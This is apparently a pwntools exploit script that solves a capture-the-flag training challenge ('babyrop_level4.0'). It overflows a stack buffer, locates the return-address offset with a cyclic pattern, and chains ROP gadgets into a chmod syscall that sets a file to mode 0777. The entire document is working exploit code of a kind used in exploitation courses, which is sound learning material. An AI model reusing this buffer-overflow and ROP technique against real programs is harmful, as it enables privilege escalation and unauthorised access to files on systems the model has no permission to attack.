#!/usr/bin/python3
from pwn import *

# INITIALIZATION
context.arch = 'amd64'
context.log_level = 'CRITICAL'

# Load the ELF binary
elf = ELF('/challenge/babyrop_level4.0')
rop = ROP(elf)

## Calculating buffer length
# Create a process to determine the buffer length
io = elf.process(setuid=False)
io.sendline(cyclic(512, n=8))
io.wait()

# Find the offset where the cyclic pattern overwrites the return address
buffer_len = cyclic_find(io.corefile.fault_addr, n=8)

## Starting the exploit
# Create a new process for the exploit
io = elf.process()
io.recvuntil(b'located at: 0x')
buffer_addr = p64(int(io.recvuntil(b'.')[:-1], 16))

## Crafting ROP Chain
addrrr = next(elf.search(b'main\x00')) #faccio symlink anche se non necessario
# ROP chain to set the file permissions of the buffer to 0777
CHAIN = (
    p64(rop.rax.address) + p64(0x5A) +  # Set rax to the syscall number for chmod (0x5A)
    p64(rop.rdi.address) + p64(addrrr) +  # Set rdi to the address of the buffer
    p64(rop.rsi.address) + p64(0o777) +  # Set rsi to the file permissions (0777)
    p64(rop.syscall.address)  # Make the syscall
)

# Construct the payload with the ROP chain
PAYLOAD = b'A' * (buffer_len) + CHAIN

# Send the payload to the binary
io.sendline(PAYLOAD)

# Print the output received from the binary
print(io.recvall().decode())
